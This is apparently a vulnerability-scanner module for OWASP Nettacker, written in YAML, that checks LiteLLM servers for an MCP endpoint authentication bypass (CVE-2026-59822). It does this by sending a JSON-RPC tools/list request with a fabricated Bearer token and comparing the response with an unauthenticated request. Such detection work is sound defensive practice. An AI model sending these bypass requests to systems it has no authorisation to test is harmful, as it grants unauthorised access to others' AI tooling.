info:
  name: litellm_cve_2026_59822_vuln
  author: OWASP Nettacker Team
  severity: 8.8
  description: >
    LiteLLM versions prior to 1.84.0 (excluded) expose a vulnerable MCP Streamable HTTP endpoint
    that allows an unauthenticated attacker to use a fabricated Authorization header to trigger
    an OAuth2 passthrough fallback path that replaces the failed LiteLLM key validation with an 
    empty UserAPIKeyAuth() object, allowing requests to reach MCP tooling without a valid LiteLLM key.
    This module detects if the target is vulnerable by attempting to access the MCP tooling endpoint with 
    a fabricated Authorization header and checking for successful responses that indicate an authentication bypass:
    1. It first attempts to access the MCP tooling endpoint without a valid Authorization header to check if authentication is in place.
    2. If authentication is required, it then attempts to access the endpoint with the fabricated Authorization header to determine if the target is vulnerable.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-59822
    - https://www.wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise
  profiles:
    - vuln
    - http
    - high_severity
    - cve
    - cve2026
    - litellm
    - cisa_kev

payloads:
  # Check if authentication is in place
  - library: http
    steps:
      - method: post
        timeout: 3
        headers:
          User-Agent: "{user_agent}"
          Content-Type: "application/json"
          Accept: "application/json, text/event-stream"
        ssl: false
        allow_redirects: false
        json:
          jsonrpc: "2.0"
          id: 1234
          method: "tools/list"
          params: 
            name: "nettacker_cve_2026_59822"
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/mcp/"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
              ports:
                - 4000 # default litellm port
        response:
          save_to_temp_events_only: authentication_in_place_http_default_port
          condition_type: and
          conditions:
            status_code:
              regex: ^\d\d\d$
              reverse: false

      # Attempt authentication bypass with fabricated Authorization header: 
      # it is successful only if the status code differs from the previous authentication check, besides meeting the other conditions
      - method: post
        timeout: 3
        headers:
          User-Agent: "{user_agent}"
          Authorization: "Bearer NETTACKER-CVE-2026-59822"
          Content-Type: "application/json"
          Accept: "application/json, text/event-stream"
        ssl: false
        allow_redirects: false
        json:
          jsonrpc: "2.0"
          id: 1234
          method: "tools/list"
          params: 
            name: "nettacker_cve_2026_59822"
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/mcp/"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
              ports:
                - 4000 # default litellm port
        response:
          dependent_on_temp_event: authentication_in_place_http_default_port
          condition_type: and
          conditions:
            status_code:
              regex: dependent_on_temp_event[0]['status_code'][0]
              reverse: true
            iterative_response_match:
              authentication_bypass:
                response:
                  condition_type: and
                  conditions:
                    status_code:
                      regex: ^2\d\d$
                      reverse: false
                    content:
                      regex: (?s)"jsonrpc"\s*:\s*"2.0".*"id"\s*:\s*1234.*"tools"
                      reverse: false

